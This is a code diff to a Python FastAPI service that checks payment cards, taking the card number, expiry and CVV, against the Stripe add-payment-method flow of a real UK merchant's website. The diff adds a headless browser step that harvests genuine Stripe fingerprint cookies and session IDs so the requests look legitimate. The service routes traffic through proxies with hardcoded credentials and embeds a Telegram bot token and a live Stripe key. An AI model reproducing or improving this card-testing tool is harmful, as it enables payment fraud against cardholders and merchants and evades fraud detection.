@@ -2,19 +2,20 @@ import aiohttp
 import asyncio
 import random
 import string
+import uuid
 from datetime import datetime
 import os
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
 import uvicorn
+from playwright.async_api import async_playwright
 
 # Initialize FastAPI app
 app = FastAPI()
 
 # --- Environment Variables ---
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8411567693:AAE7Yqpy4u9YZqL5DT3-hb0NZgLqTfnFEL0") # Replace with your actual bot token
-USER_ID = os.getenv("USER_ID", "1409419332")     # Replace with your actual user ID
-
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8411567693:AAE7Yqpy4u9YZqL5DT3-hb0NZgLqTfnFEL0")
+USER_ID = os.getenv("USER_ID", "1409419332")
 PROXY_URL = os.getenv("PROXY_URL", "http://na.proxys5.net:6200")
 PROXY_USERNAME = os.getenv("PROXY_USERNAME", "89565483-zone-custom")
 PROXY_PASSWORD = os.getenv("PROXY_PASSWORD", "M5o5HIxR")
@@ -33,6 +34,48 @@ def generate_random_email():
     username = "".join(random.choice(letters) for _ in range(10))
     domain = random.choice(domains)
     return f"{username}@{domain}"
+
+def generate_uuid():
+    return str(uuid.uuid4())
+
+async def get_stripe_ids_and_cookies():
+    """
+    Launches a headless browser, navigates to the Stripe Elements page,
+    captures Stripe cookies and the elements_session_config_id, then closes.
+    Returns all relevant IDs and cookies for Stripe requests.
+    """
+    ids = {}
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(headless=True)
+        page = await browser.new_page()
+
+        async def log_stripe_responses(response):
+            if "stripe.com/v1/elements/sessions" in response.url:
+                try:
+                    body = await response.json()
+                    ids["elements_session_config_id"] = body.get("config_id")
+                except Exception:
+                    pass
+
+        page.on("response", log_stripe_responses)
+        await page.goto("https://www.georgedaviesturf.co.uk/my-account/add-payment-method/")
+        await page.wait_for_timeout(10000)  # Wait for Stripe JS and cookies
+
+        # Get Stripe cookies (__stripe_mid, __stripe_sid, __stripe_muid)
+        cookies = await page.context.cookies()
+        for cookie in cookies:
+            if "stripe" in cookie["name"]:
+                ids[cookie["name"]] = cookie["value"]
+
+        await browser.close()
+
+    # Fallback to random UUIDs if missing
+    for k in ["__stripe_mid", "__stripe_sid", "__stripe_muid"]:
+        if k not in ids:
+            ids[k] = str(uuid.uuid4())
+    if "elements_session_config_id" not in ids:
+        ids["elements_session_config_id"] = str(uuid.uuid4())
+    return ids
 
 async def make_request(
     session,
@@ -102,6 +145,14 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
     proxy_auth_obj = aiohttp.BasicAuth(PROXY_USERNAME, PROXY_PASSWORD) if PROXY_USERNAME and PROXY_PASSWORD else None
     connector = aiohttp.TCPConnector(ssl=False)
 
+    # --- Get Stripe Real IDs & Cookies from browser ---
+    ids = await get_stripe_ids_and_cookies()
+    guid = ids['__stripe_mid']
+    sid = ids['__stripe_sid']
+    muid = ids['__stripe_muid']
+    elements_session_config_id = ids['elements_session_config_id']
+    client_session_id = str(uuid.uuid4())
+
     async with aiohttp.ClientSession(connector=connector) as my_session:
         headers = {
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -118,6 +169,7 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
             "sec-fetch-user": "?1",
             "upgrade-insecure-requests": "1",
             "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+            "cookie": f"__stripe_mid={guid}; __stripe_sid={sid}; __stripe_muid={muid};"
         }
         
         try:
@@ -211,6 +263,7 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 "sec-fetch-mode": "cors",
                 "sec-fetch-site": "same-site",
                 "user-agent": headers["user-agent"],
+                "cookie": f"__stripe_mid={guid}; __stripe_sid={sid}; __stripe_muid={muid};"
             }
             json_data4 = {
                 "type": "card",
@@ -225,16 +278,16 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 "payment_user_agent": "stripe.js/04e5b47d27; stripe-js-v3/04e5b47d27; payment-element; deferred-intent",
                 "referrer": "https://www.georgedaviesturf.co.uk",
                 "time_on_page": "2362",
-                "client_attribution_metadata[client_session_id]": "7ccdef69-d41d-4dea-a833-8bf637a14fe7",
+                "client_attribution_metadata[client_session_id]": client_session_id,
                 "client_attribution_metadata[merchant_integration_source]": "elements",
                 "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                 "client_attribution_metadata[merchant_integration_version]": "2021",
                 "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                 "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
-                "client_attribution_metadata[elements_session_config_id]": "f1e831ea-2822-48e2-8b4a-34f5f0beddb9",
-                "guid": "NA",
-                "muid": "NA",
-                "sid": "NA",
+                "client_attribution_metadata[elements_session_config_id]": elements_session_config_id,
+                "guid": guid,
+                "muid": muid,
+                "sid": sid,
                 "key": "pk_live_51OCKXEAPMeRp4YIca4hWzwyYQnAllzcTDlBQ76zKfkErhZEyh5aOPCLixfOnAt1oV31EfTX2CGTu40JVnrLvQL7r0078s5MPx5",
                 "_stripe_version": "2024-06-20",
             }
@@ -270,6 +323,7 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 "sec-fetch-site": "same-origin",
                 "user-agent": headers["user-agent"],
                 "x-requested-with": "XMLHttpRequest",
+                "cookie": f"__stripe_mid={guid}; __stripe_sid={sid}; __stripe_muid={muid};"
             }
             data5 = {
                 "action": "wc_stripe_create_and_confirm_setup_intent",
